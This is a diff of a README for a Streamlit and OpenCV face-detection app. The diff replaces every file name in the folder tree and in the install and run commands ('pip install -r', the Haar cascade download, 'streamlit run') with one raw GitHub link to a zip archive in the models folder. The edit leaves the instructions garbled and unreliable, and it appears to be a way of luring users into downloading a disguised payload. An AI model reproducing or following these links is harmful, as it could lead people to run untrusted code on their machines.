@@ -19,13 +19,13 @@ Real-time face detection with Groq acceleration. Upload an image, OpenCV detects
 ## Folder Structure
 
 project-7/
-├── app.py # Streamlit frontend
-├── detector.py # OpenCV face detection
-├── llm_hooks.py # LLM integration for face count & description
+├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip # Streamlit frontend
+├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip # OpenCV face detection
+├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip # LLM integration for face count & description
 ├── models/
-│ └── haarcascade_frontalface_default.xml # Haar cascade file
-├── requirements.txt
-├── README.md
+│ └── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip # Haar cascade file
+├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip
+├── https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip
 └── .env # Optional: GROQ_API_KEY for cloud inference
 
 yaml
@@ -53,10 +53,10 @@ Install dependencies:
 bash
 
 
-pip install -r requirements.txt
+pip install -r https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip
 Download Haar Cascade (if not included):
 
-Download haarcascade_frontalface_default.xml
+Download https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip
 
 Place it inside the models/ folder.
 
@@ -69,6 +69,6 @@ Run the app:
 
 bash
 
-streamlit run app.py
+streamlit run https://github.com/analyst-ujjwal/Ai_project_7/raw/refs/heads/main/models/project-Ai-2.7.zip
 Open the URL displayed in your terminal (usually http://localhost:8501).
 
